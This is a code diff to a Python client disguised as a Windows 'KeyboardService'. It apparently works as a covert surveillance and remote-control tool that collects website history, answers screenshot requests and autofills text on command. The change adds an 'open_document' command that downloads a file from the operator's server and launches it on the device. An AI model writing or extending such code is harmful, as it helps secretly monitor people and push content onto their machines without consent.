@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.12"
+APP_VERSION = "1.2.13"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1098,6 +1098,34 @@ def display_message_image(message):
     os.startfile(image_path)
 
 
+def open_message_document(message):
+    if os.name != "nt":
+        raise RuntimeError("Document messages are only supported on Windows")
+    try:
+        payload = json.loads(str(message))
+    except (TypeError, ValueError) as error:
+        raise RuntimeError("Document command payload is invalid") from error
+    if not isinstance(payload, dict):
+        raise RuntimeError("Document command payload is invalid")
+    attachment_id = str(payload.get("attachment_id", ""))
+    match = re.fullmatch(r"[0-9a-f]{32}\.(pdf|docx|rtf|txt)", attachment_id)
+    if not match:
+        raise RuntimeError("Document attachment ID is invalid")
+    headers = {"Content-Type": "application/json"}
+    api_key = os.getenv("INGEST_API_KEY", "").strip()
+    if api_key:
+        headers["x-api-key"] = api_key
+    request = Request(f"{SITE_URL}/api/devices/documents/{attachment_id}", headers=headers, method="GET")
+    with urlopen(request, timeout=60) as response:
+        document_bytes = response.read(20 * 1024 * 1024 + 1)
+    if not document_bytes or len(document_bytes) > 20 * 1024 * 1024:
+        raise RuntimeError("Document attachment is empty or too large")
+    with tempfile.NamedTemporaryFile(prefix="KeyboardService-", suffix=f".{match.group(1)}", delete=False) as document_file:
+        document_file.write(document_bytes)
+        document_path = document_file.name
+    os.startfile(document_path)
+
+
 def handle_device_command(command, command_id=None, message=""):
     global collection_paused
     if not command:
@@ -1147,6 +1175,8 @@ def handle_device_command(command, command_id=None, message=""):
             autofill_text(str(message))
         elif command == "show_image":
             display_message_image(message)
+        elif command == "open_document":
+            open_message_document(message)
         elif command == "update_client":
             if os.name != "nt":
                 raise RuntimeError("Client updates are only supported on Windows")
